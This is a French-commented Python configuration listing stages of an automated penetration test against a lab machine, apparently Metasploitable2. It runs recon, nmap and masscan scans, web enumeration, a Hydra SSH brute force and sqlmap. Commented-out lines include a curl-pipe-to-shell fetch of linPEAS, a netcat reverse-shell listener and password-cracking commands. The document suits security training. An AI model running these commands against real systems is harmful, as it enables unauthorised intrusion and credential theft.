# ============================================================
# CONFIGURATION DES ÉTAPES
# (module, nom, commande) — {target} et {url} sont remplacés
# automatiquement. Une ligne commentée (#) = pas exécutée par
# défaut, parce qu'elle a besoin d'un setup différent (expliqué
# juste à côté). Décommente-la une fois ce setup fait.
# ============================================================
STEPS = [
    # ---------------- RECONNAISSANCE ----------------
    ("Reconnaissance", "Ping", "ping -c 4 {target}"),
    ("Reconnaissance", "Whois", "whois {target}"),
    # theHarvester sert à chercher des emails/sous-domaines d'un NOM DE
    # DOMAINE public (ex: exemple.com), pas d'une IP de lab privé :
    # ("Reconnaissance", "theHarvester", "theHarvester -d {target} -b all"),

    # ---------------- SCANNING ----------------
    ("Scanning", "Nmap - scan complet (ports + versions)", "nmap -sV -sC -p- {target}"),
    ("Scanning", "Masscan - scan rapide tous ports", "masscan -p1-65535 {target} --rate=1000"),
    # Legion = GUI qui automatise nmap + plein d'outils d'énumération
    # tout seul (fork de Sparta). C'est une interface graphique à part,
    # pas lançable en une ligne de commande comme les autres — tu le
    # démarres pis tu rentres l'IP dedans directement :
    #   legion

    # ---------------- ÉNUMÉRATION ----------------
    ("Énumération", "SMB enum", "enum4linux -a {target}"),
    ("Énumération", "Dossiers/fichiers web (gobuster)", "gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt"),
    ("Énumération", "Scan vulnérabilités web (nikto)", "nikto -h {url}"),
    ("Énumération", "SNMP walk", "snmpwalk -v2c -c public {target}"),

    # ---------------- EXPLOITATION ----------------
    ("Exploitation", "Hydra - brute force SSH", "hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://{target}"),
    ("Exploitation", "sqlmap - test injection SQL", "sqlmap -u {url} --batch --banner"),
    # Metasploit s'automatise avec un "resource script" (.rc) préparé
    # d'avance — remplace mon_script.rc par le tien :
    # ("Exploitation", "Metasploit (resource script)", "msfconsole -q -r mon_script.rc"),
    # Burp Suite est surtout un outil interactif (proxy GUI) — pas
    # vraiment automatisable dans un pipeline CLI comme celui-ci.

    # ---------------- POST-EXPLOITATION ----------------
    # Ces étapes supposent que t'as DÉJÀ un accès/shell sur la machine
    # (donc après l'étape Exploitation, une fois dedans) — à rouler
    # manuellement dans ce shell, pas dans ce pipeline automatique :
    #   linPEAS (énum. de privilege escalation Linux, dans Metasploitable2) :
    #     curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
    #   netcat (reverse shell) : nc -lvnp 4444   (sur ta Kali, en écoute)
    #   Mimikatz : outil propre à Windows/Active Directory — ne s'applique
    #   pas à Metasploitable2, qui est du Linux.

    # ---------------- OUTILS AVANCÉS ----------------
    ("Outils avancés", "Capture réseau (tcpdump, 15s)", "timeout 15 tcpdump -i eth0 -w capture.pcap"),
    # John / Hashcat ont besoin d'un FICHIER DE HASH en entrée (pas
    # juste une IP) — à utiliser une fois que t'as récupéré des hash :
    # ("Outils avancés", "John the Ripper", "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt"),
    # ("Outils avancés", "Hashcat", "hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt"),
    # Aircrack-ng s'applique au WIFI (interface sans fil en mode
    # monitor), pas à une cible réseau filaire comme Metasploitable2 :
    # ("Outils avancés", "Aircrack-ng", "aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap"),
    # Wifite = automatise les attaques wifi (WEP/WPA/WPS) en enchaînant
    # plusieurs outils (aircrack-ng, reaver, etc.) tout seul. Même chose
    # que Aircrack-ng : demande une interface wifi en mode monitor, pas
    # une IP — remplace {interface} par la tienne (ex: wlan0) :
    # ("Outils avancés", "Wifite", "wifite -i {interface} --kill"),
]
